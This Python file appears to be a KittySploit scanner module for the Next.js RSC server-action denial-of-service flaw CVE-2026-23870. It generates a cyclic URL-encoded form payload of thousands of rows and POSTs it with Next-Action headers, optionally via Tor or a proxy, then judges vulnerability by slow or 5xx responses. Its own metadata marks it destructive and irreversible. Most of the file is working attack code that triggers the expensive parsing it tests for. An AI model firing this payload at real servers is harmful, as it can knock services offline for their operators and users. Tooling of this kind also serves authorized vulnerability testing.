#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from urllib.parse import quote

import requests

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.nextjs_probe import ensure_nextjs_target


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Next.js RSC server-action DoS (CVE-2026-23870) — detect",
        "description": (
            "Single lightweight POST of a cyclic RSC form (x-www-form-urlencoded) with Next-Action + "
            "Accept: text/x-component. Long wall time or 5xx suggests pre-16.2.5-style parsing cost."
        ),
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-23870",
        "references": ["https://github.com/advisories/GHSA-8h8q-6873-q5fj"],
        "tags": ["scanner", "http", "nextjs", "dos", "rsc"],
    'agent': {
        'risk': 'destructive',
        'effects': ['target_modification'],
        'expected_requests': 2,
        'reversible': False,
        'approval_required': True,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
    },
    }

    next_action = OptString(
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "Next-Action header (40-char id on real targets)",
        required=False,
    )
    post_timeout = OptInteger(90, "POST probe timeout (seconds)", required=False, advanced=True)
    check_rows = OptInteger(4000, "Cyclic form rows (smaller = gentler)", required=False, advanced=True)
    vulnerable_wall_seconds = OptFloat(2.0, "Wall time above = likely vulnerable", required=False, advanced=True)

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _url(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        path = str(self.path).strip() or "/"
        if not path.startswith("/"):
            path = "/" + path
        return f"{proto}://{t}:{p}{path}"

    def _verify_proxies(self):
        verify = self._to_bool(self._o(self.verify_ssl))
        px = str(self._o(self.proxy) or "").strip()
        proxies = {}
        if px:
            proxies = {"http": px, "https": px}
        elif self.framework and getattr(self.framework, "is_tor_enabled", lambda: False)():
            tor = self.framework.tor_manager.get_tor_proxy_dict()
            if tor:
                proxies = tor
        elif self.framework and getattr(self.framework, "is_proxy_enabled", lambda: False)():
            u = self.framework.get_proxy_url()
            if u:
                proxies = {"http": u, "https": u, "all": u}
        return verify, proxies or None

    @staticmethod
    def _body(rows: int) -> bytes:
        parts = []
        for i in range(rows):
            n = (i + 1) % rows
            v = f'["$F","{i:x}",{{"r":"${n:x}"}}]'
            parts.append(f"{i}={quote(v, safe='')}")
        return "&".join(parts).encode()

    def _post(self, body: bytes, timeout: float):
        self._configure_session()
        verify, proxies = self._verify_proxies()
        h = {str(k): str(v) for k, v in self.session.headers.items()}
        h.update(
            {
                "Content-Type": "application/x-www-form-urlencoded",
                "Next-Action": str(self._o(self.next_action)),
                "Accept": "text/x-component",
            }
        )
        t0 = time.perf_counter()
        try:
            r = requests.post(self._url(), data=body, headers=h, timeout=timeout, verify=verify, proxies=proxies)
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def _get_baseline(self):
        verify, proxies = self._verify_proxies()
        t0 = time.perf_counter()
        try:
            self._configure_session()
            r = self.session.get(
                self._url(), timeout=float(self._o(self.timeout)), verify=verify, proxies=proxies
            )
            return r.status_code, time.perf_counter() - t0, None
        except requests.RequestException as e:
            return -1, time.perf_counter() - t0, str(e)

    def run(self):
        if not ensure_nextjs_target(self):
            return False
        rows = max(100, int(self._o(self.check_rows)))
        to = float(self._o(self.post_timeout))
        bc, _, be = self._get_baseline()
        if be and "Connection" in be:
            self.set_info(reason=f"GET unreachable: {be}")
            return False
        body = self._body(rows)
        c, w, e = self._post(body, to)
        if e and "Connection" in e:
            self.set_info(reason=f"POST unreachable: {e}")
            return False
        thr = float(self._o(self.vulnerable_wall_seconds))
        hit = w > thr or c in (500, 502, 503, 504)
        if hit:
            self.set_info(reason=f"Probe {rows} rows: HTTP {c}, {w:.2f}s", confidence="medium", baseline_http=bc)
            return True
        self.set_info(reason=f"No strong signal HTTP {c}, {w:.2f}s", probe_http=c, baseline_http=bc)
        return False
